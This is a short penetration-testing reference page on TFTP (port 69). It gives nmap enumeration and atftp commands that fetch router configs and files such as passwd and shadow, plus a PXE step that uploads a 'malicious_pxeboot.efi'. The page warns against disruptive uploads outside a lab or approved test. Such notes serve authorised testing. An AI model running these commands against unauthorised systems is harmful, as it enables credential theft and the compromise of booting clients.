# TFTP (69)

!!! tip "Start here"
    TFTP has no authentication, fetch common config files immediately: `atftp --get --remote-file running-config --local-file running-config $IP`. Network device configs often contain SNMP community strings, local credentials, and VPN pre-shared keys.

---

## Enumeration

```bash
nmap -sU -p 69 --script tftp-enum $IP
```

---

## Fetching Files

```bash
atftp --get --remote-file running-config --local-file running-config $IP
atftp --get --remote-file startup-config --local-file startup-config $IP
```

Common files to try:

```
running-config
startup-config
config.cfg
router.conf
passwd
shadow
```

---

## Uploading Files

TFTP normally exposes paths relative to a configured server root and provides no directory listing. If writes are allowed, validate with a harmless text file:

```bash
printf 'runbook-write-check\n' > tftp-write-check.txt
atftp --put --local-file tftp-write-check.txt --remote-file tftp-write-check.txt $IP
```

---

## PXE Boot Abuse

If the TFTP server is used for PXE booting, download boot files and check if they're writable:

!!! warning "Watch out"
    Replacing a referenced boot image can affect every client that next boots from PXE. Do not upload or overwrite boot files outside an isolated lab or an explicitly approved disruptive test.

```bash
tftp $IP
tftp> get pxelinux.0
tftp> get boot.cfg
tftp> put malicious_pxeboot.efi
```
